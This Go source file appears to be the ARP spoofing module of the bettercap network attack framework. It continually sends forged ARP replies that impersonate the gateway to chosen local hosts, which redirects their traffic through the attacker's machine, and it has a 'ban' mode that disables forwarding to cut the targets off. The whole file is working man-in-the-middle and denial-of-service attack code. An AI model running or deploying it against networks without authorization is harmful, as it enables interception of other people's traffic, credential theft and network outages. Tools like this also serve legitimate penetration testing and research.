package modules

import (
	"bytes"
	"net"
	"sync"
	"time"

	"github.com/bettercap/bettercap/log"
	"github.com/bettercap/bettercap/network"
	"github.com/bettercap/bettercap/packets"
	"github.com/bettercap/bettercap/session"
)

type ArpSpoofer struct {
	session.SessionModule
	addresses  []net.IP
	macs       []net.HardwareAddr
	wAddresses []net.IP
	wMacs      []net.HardwareAddr
	ban        bool
	waitGroup  *sync.WaitGroup
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	p := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		addresses:     make([]net.IP, 0),
		macs:          make([]net.HardwareAddr, 0),
		wAddresses:    make([]net.IP, 0),
		wMacs:         make([]net.HardwareAddr, 0),
		ban:           false,
		waitGroup:     &sync.WaitGroup{},
	}

	p.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges."))

	p.AddParam(session.NewStringParameter("arp.spoof.whitelist", "", "", "Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing."))

	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.ban on", "",
		"Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.",
		func(args []string) error {
			p.ban = true
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.spoof off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	p.AddHandler(session.NewModuleHandler("arp.ban off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	return p
}

func (p ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (p ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (p ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (p *ArpSpoofer) Configure() error {
	var err error
	var targets string
	var whitelist string

	if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
		return err
	} else if err, whitelist = p.StringParam("arp.spoof.whitelist"); err != nil {
		return err
	} else if p.addresses, p.macs, err = network.ParseTargets(targets, p.Session.Lan.Aliases()); err != nil {
		return err
	} else if p.wAddresses, p.wMacs, err = network.ParseTargets(whitelist, p.Session.Lan.Aliases()); err != nil {
		return err
	}

	log.Debug(" addresses=%v macs=%v whitelisted-addresses=%v whitelisted-macs=%v", p.addresses, p.macs, p.wAddresses, p.wMacs)

	if p.ban == true {
		log.Warning("Running in BAN mode, forwarding not enabled!")
		p.Session.Firewall.EnableForwarding(false)
	} else if p.Session.Firewall.IsForwardingEnabled() == false {
		log.Info("Enabling forwarding.")
		p.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (p *ArpSpoofer) Start() error {
	if err := p.Configure(); err != nil {
		return err
	}

	return p.SetRunning(true, func() {
		from := p.Session.Gateway.IP
		from_hw := p.Session.Interface.HW

		log.Info("ARP spoofer started, probing %d targets.", len(p.addresses)+len(p.macs))

		p.waitGroup.Add(1)
		defer p.waitGroup.Done()

		for p.Running() {
			p.sendArp(from, from_hw, true, true)
			time.Sleep(1 * time.Second)
		}
	})
}

func (p *ArpSpoofer) Stop() error {
	return p.SetRunning(false, func() {
		log.Info("Waiting for ARP spoofer to stop ...")
		p.unSpoof()
		p.ban = false
		p.waitGroup.Wait()
	})
}

func (p *ArpSpoofer) isWhitelisted(ip string, mac net.HardwareAddr) bool {
	for _, addr := range p.wAddresses {
		if ip == addr.String() {
			return true
		}
	}

	for _, hw := range p.wMacs {
		if bytes.Compare(hw, mac) == 0 {
			return true
		}
	}

	return false
}

func (p *ArpSpoofer) sendArp(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	p.waitGroup.Add(1)
	defer p.waitGroup.Done()

	targets := make(map[string]net.HardwareAddr, 0)

	for _, ip := range p.addresses {
		if p.Session.Skip(ip) == true {
			log.Debug("Skipping address %s from ARP spoofing.", ip)
			continue
		}

		// do we have this ip mac address?
		hw, err := findMAC(p.Session, ip, probe)
		if err != nil {
			log.Debug("Could not find hardware address for %s, retrying in one second.", ip.String())
			continue
		}

		targets[ip.String()] = hw
	}

	for _, hw := range p.macs {
		ip, err := network.ArpInverseLookup(p.Session.Interface.Name(), hw.String(), false)
		if err != nil {
			log.Warning("Could not find IP address for %s, retrying in one second.", hw.String())
			continue
		}

		if p.Session.Skip(net.ParseIP(ip)) == true {
			log.Debug("Skipping address %s from ARP spoofing.", ip)
			continue
		}

		targets[ip] = hw
	}

	for ip, mac := range targets {
		if check_running && p.Running() == false {
			return
		} else if p.isWhitelisted(ip, mac) {
			log.Debug("%s (%s) is whitelisted, skipping from spoofing loop.", ip, mac)
			continue
		}

		if err, pkt := packets.NewARPReply(saddr, smac, net.ParseIP(ip), mac); err != nil {
			log.Error("Error while creating ARP spoof packet for %s: %s", ip, err)
		} else {
			log.Debug("Sending %d bytes of ARP packet to %s:%s.", len(pkt), ip, mac.String())
			p.Session.Queue.Send(pkt)
		}
	}
}

func (p *ArpSpoofer) unSpoof() error {
	from := p.Session.Gateway.IP
	from_hw := p.Session.Gateway.HW

	log.Info("Restoring ARP cache of %d targets.", len(p.addresses)+len(p.macs))

	p.sendArp(from, from_hw, false, false)

	return nil
}
